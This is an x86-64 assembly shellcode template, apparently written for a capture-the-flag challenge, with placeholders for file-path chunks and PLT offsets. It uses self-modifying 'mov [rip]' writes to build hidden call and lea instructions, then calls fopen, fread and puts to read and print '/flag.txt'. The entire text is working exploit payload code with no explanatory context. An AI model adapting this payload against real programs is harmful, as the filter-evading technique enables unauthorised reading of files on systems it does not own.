; push rbp
mov word ptr [rip], 0x8d48
mov rsp, [rbp - 0x230] ; rbp - rsp = 0x228
mov [rsp], rbp

mov rbp, rsp

mov word ptr [rip], 0x8d48
mov rsp, [rbp - 0x230] ; rbp - rsp = 0x50

; set params
mov qword ptr [rbp - 0x50], {flagpath1} ; /fla
mov qword ptr [rbp - 0x4c], {flagpath2} ; g.tx
mov qword ptr [rbp - 0x48], {flagpath3} ; t\0
mov qword ptr [rbp - 0x40], {modepath} ; r\0
mov qword ptr [rbp - 0x38], {flength} ; 256
mov qword ptr [rbp - 0x30], {fstep} ; 1
mov qword ptr [rbp - 0x28], rdx ; first addr

; params for ptr = fopen("/flag.txt","rb/r")
mov word ptr [rip], 0x8d48
mov rdi, [rbp - 0x50]
mov word ptr [rip], 0x8d48
mov rsi, [rbp - 0x40]

; get func addr
mov r12, [rbp + 8]
mov word ptr [rip], 0x8d49 ;lea rax, [r12 + 0x8080]
mov rax, [r12 + {fopen_plt}] ; E8 + fopen@plt - ret - delta(rip)
;call rax "\xff\xd0"
mov word ptr [rip], 0xd0ff ; 7Bytes
mov eax, 0x90909090 ;5Byte padding for call fopen

; call fread(buf, 1, n, ptr)
mov word ptr [rip], 0x8d48
mov rdi, [rbp - 0x230]
mov rsi, [rbp - 0x30]
mov rdx, [rbp - 0x38]
mov rcx, rax
; save rbp, since it may change
mov r14, rbp
; get func addr
mov r12, [rbp + 8]
mov word ptr [rip], 0x8d49 ;lea rax, [r12 + 0x8080]
mov rax, [r12 + {fread_plt}] ; E8 + fopen@plt - ret - delta(rip)
;call rax "\xff\xd0"
mov word ptr [rip], 0xd0ff ; 7Bytes
mov eax, 0x90909090 ;5Byte padding for call fread
mov rbp, r14

;append \0
mov byte ptr [rbp + rax - 0x230], 0

;call puts(buf)
mov word ptr [rip], 0x8d48
mov rdi, [rbp - 0x230]
; get func addr
mov r12, [rbp + 8]
mov word ptr [rip], 0x8d49 ;lea rax, [r12 + 0x8080]
mov rax, [r12 + {puts_plt}] ; E8 + fopen@plt - ret - delta(rip)
;call rax "\xff\xd0"
mov word ptr [rip], 0xd0ff ; 7Bytes
mov eax, 0x90909090 ;5Byte padding for call puts

; mov rsp, rbp; 
mov rsp, rbp

;pop rbp;leave;ret \x5d\xc9\xc3
mov dword ptr [rip], 0x90c3c95d ; 7Bytes
mov eax, 0x90909090